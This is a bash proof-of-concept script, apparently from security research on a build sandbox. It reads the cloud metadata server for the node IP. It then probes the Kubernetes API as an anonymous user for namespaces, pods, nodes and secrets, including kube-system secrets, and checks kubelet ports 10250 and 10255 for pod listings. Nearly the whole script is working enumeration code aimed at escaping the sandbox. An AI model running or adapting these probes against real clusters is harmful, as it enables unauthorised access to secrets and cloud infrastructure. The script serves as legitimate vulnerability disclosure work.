#!/usr/bin/env bash
# K8s API reachable from the build sandbox -- what does system:anonymous get?
# READ-ONLY: GETs plus SelfSubjectRulesReview (non-mutating). No writes, no deletes.
set +e
B="YEXTPOC7731"; echo "$B-BEGIN"
MD=http://169.254.169.254/computeMetadata/v1; H='Metadata-Flavor: Google'
K=https://kubernetes.default.svc

echo "$B === 0. NETWORK FACTS ==="
cat /etc/resolv.conf 2>&1 | head -5
NODEIP=$(curl -s -m 6 -H "$H" "$MD/instance/network-interfaces/0/ip" 2>&1); echo "node ip = $NODEIP"
getent hosts kubernetes.default.svc 2>&1
getent hosts kubernetes.default.svc.cluster.local 2>&1

echo "$B === 1. K8S API AS system:anonymous ==="
k(){ printf '%-56s ' "$1"; curl -sk -m 10 -o - -w ' [HTTP %{http_code}]' "$K$1" 2>&1 | tr -d '\n' | head -c 320; echo; }
k /version
k /api
k /apis
k /api/v1/namespaces
k /api/v1/pods
k /api/v1/secrets
k /api/v1/namespaces/live-preview-sbx/secrets
k /api/v1/namespaces/live-preview-sbx/pods
k /api/v1/namespaces/kube-system/secrets
k /api/v1/nodes
k /healthz
k /metrics

echo "$B === 2. WHAT AM I? (SelfSubjectReview / RulesReview, anonymous) ==="
curl -sk -m 10 -X POST -H 'content-type: application/json' \
 -o - -w ' [HTTP %{http_code}]' \
 "$K/apis/authentication.k8s.io/v1/selfsubjectreviews" \
 -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' 2>&1 | head -c 400; echo
curl -sk -m 10 -X POST -H 'content-type: application/json' \
 -o - -w ' [HTTP %{http_code}]' \
 "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
 -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"live-preview-sbx"}}' 2>&1 | head -c 600; echo

echo "$B === 3. KUBELET ON THE REAL NODE IP ==="
for P in 10250 10255; do
  printf 'https://%s:%s/pods  ' "$NODEIP" "$P"
  curl -sk -m 8 -o - -w ' [HTTP %{http_code}]' "https://$NODEIP:$P/pods" 2>&1 | tr -d '\n' | head -c 220; echo
  printf 'http://%s:%s/pods   ' "$NODEIP" "$P"
  curl -s  -m 8 -o - -w ' [HTTP %{http_code}]' "http://$NODEIP:$P/pods"  2>&1 | tr -d '\n' | head -c 220; echo
done

echo "$B-END"; exit 0
